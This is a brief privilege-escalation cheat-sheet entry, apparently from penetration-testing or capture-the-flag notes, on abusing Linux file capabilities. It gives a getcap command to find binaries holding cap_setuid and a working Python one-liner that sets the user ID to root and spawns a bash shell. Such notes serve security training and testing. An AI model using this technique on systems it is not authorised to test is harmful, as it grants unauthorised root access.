# Linux Capability cap_setuid Abuse

Check for file capabilities, not just SUID bits — `getcap -r /` run by linpeas or by hand can reveal an interpreter granted `cap_setuid=ep` directly, which skips the usual SUID-wrapper requirement entirely:

```bash
getcap -r / 2>/dev/null | grep cap_setuid
/path/to/capable-python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```
